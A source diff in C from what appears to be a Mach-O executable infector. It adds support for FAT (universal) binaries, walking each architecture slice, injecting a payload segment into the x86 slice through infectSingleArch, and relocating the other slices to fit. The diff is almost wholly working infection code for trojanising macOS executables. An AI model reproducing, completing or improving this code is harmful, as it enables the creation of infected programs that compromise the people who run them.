@@ -989,9 +989,80 @@ main (int argc, _mChar *argv[])
     case kFatBinary:
       {
         gFileType = 1;
-        printf ("[ii] FAT Binary found [TODO]\n");
-        
-        //infectBinary (kFatBinary);
+        int x86Found      = 0;
+
+        gFileType = 1;
+        nfat = gFatHeader.nfat_arch;
+        int fArchSize = 0;
+
+        printf ("[ii] FAT Binary found\n");
+        printf ("[ii] Found %d Arch(s)\n", nfat);
+
+        memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
+        outputOffset  += sizeof (gFatHeader);
+        inputOffset   += sizeof (gFatHeader);
+
+        for (i = 0; i < nfat; i++)
+          {
+            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
+            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));
+
+            cputype       = f_arch->cputype;
+            archOffset    = f_arch->offset;
+            fArchSize     = f_arch->size;
+#ifdef DEBUG
+            printf ("[ii] cputype: %d\n", cputype);
+            printf ("[ii] archOffset: 0x%x\n", archOffset);
+#endif
+            if (cputype == CPU_TYPE_X86)
+              {
+                x86Found++;
+
+                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                      (char *)(outputFilePointer),
+                                                      archOffset,
+                                                      fArchSize,
+                                                      outputFileSize);
+#ifdef DEBUG
+                printf("offsetToRes: %d\n", offsetToResources);
+#endif
+                fArchSize += sizeof (struct segment_command)
+                              + outputFileSize
+                              + offsetToResources;
+
+                f_arch->size = fArchSize;
+                //offsetToResources -= archOffset;
+              }
+            else
+              {
+                if (x86Found)
+                  {
+                  archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
+
+                  if (archOffset % PAGE_ALIGNMENT)
+                    archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+#ifdef DEBUG_VERBOSE
+                  printf ("new Offset: 0x%x\n", archOffset);
+#endif
+                  }
+
+                u_int tempOfft = f_arch->offset;
+                u_int tempSize = f_arch->size;
+
+                f_arch->offset = archOffset;
+
+                memcpy (outputFilePointer + archOffset,
+                        inputFilePointer + tempOfft,
+                        tempSize);
+              }
+
+            //f_arch->size = SWAP_LONG (f_arch->size);
+            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
+
+            free (f_arch);
+            inputOffset   += sizeof (struct fat_arch);
+            outputOffset  += sizeof (struct fat_arch);
+          }
 
         break;
       }
@@ -1001,7 +1072,8 @@ main (int argc, _mChar *argv[])
         
         gFileType = 2;
         nfat = SWAP_LONG (gFatHeader.nfat_arch);
-        
+        int fArchSize = 0;
+
         printf ("[ii] FAT (swapped) Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
         
@@ -1016,10 +1088,10 @@ main (int argc, _mChar *argv[])
             
             cputype       = SWAP_LONG (f_arch->cputype);
             archOffset    = SWAP_LONG (f_arch->offset);
-            f_arch->size  = SWAP_LONG (f_arch->size);
+            fArchSize     = SWAP_LONG (f_arch->size);
 #ifdef DEBUG
             printf ("[ii] cputype: %d\n", cputype);
-            printf ("[ii] archOffset: %d\n", archOffset);
+            printf ("[ii] archOffset: 0x%x\n", archOffset);
 #endif
             if (cputype == CPU_TYPE_X86)
               {
@@ -1028,35 +1100,42 @@ main (int argc, _mChar *argv[])
                 offsetToResources = infectSingleArch ((char *)(inputFilePointer),
                                                       (char *)(outputFilePointer),
                                                       archOffset,
-                                                      f_arch->size,
+                                                      fArchSize,
                                                       outputFileSize);
                 
-                f_arch->size += sizeof (struct segment_command)
-                                + outputFileSize
-                                + offsetToResources;
+                printf("offsetToRes: %d\n", offsetToResources);
+
+                fArchSize += sizeof (struct segment_command)
+                             + outputFileSize
+                             + offsetToResources;
                 
+                f_arch->size = SWAP_LONG (fArchSize);
                 //offsetToResources -= archOffset;
               }
             else
               {
                 if (x86Found)
                   {
-                    archOffset += offsetToResources + outputFileSize;
-                    
+                    archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
+
                     if (archOffset % PAGE_ALIGNMENT)
                       archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
 #ifdef DEBUG_VERBOSE
-                    printf ("new Offset: %d\n", archOffset);
+                    printf ("new Offset: 0x%x\n", archOffset);
 #endif
-                    f_arch->offset = SWAP_LONG (archOffset);
                   }
                 
+                u_int tempOfft = SWAP_LONG (f_arch->offset);
+                u_int tempSize = SWAP_LONG (f_arch->size);
+                
+                f_arch->offset = SWAP_LONG (archOffset);
+
                 memcpy (outputFilePointer + archOffset,
-                        inputFilePointer + archOffset,
-                        f_arch->size);
+                        inputFilePointer + tempOfft,
+                        tempSize);
               }
             
-            f_arch->size = SWAP_LONG (f_arch->size);
+            //f_arch->size = SWAP_LONG (f_arch->size);
             memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
             
             free (f_arch);
